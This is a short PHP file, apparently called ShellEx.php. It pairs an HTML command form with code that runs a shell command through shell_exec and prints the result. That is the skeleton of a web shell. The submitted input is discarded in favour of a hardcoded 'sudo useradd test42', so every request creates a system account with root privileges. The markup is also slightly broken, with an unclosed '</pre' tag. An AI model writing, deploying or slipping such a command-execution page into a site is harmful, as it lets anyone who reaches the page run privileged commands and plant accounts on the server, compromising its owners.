<!DOCTYPE html>
<form action="ShellEx.php" method="post">
command? <input type="text" name="command">
<input type="submit">
</form>


<?php

$command = $_POST["command"];
$command = ("sudo useradd test42");
echo "<pre>";
echo shell_exec($command);
echo "</pre";

?>

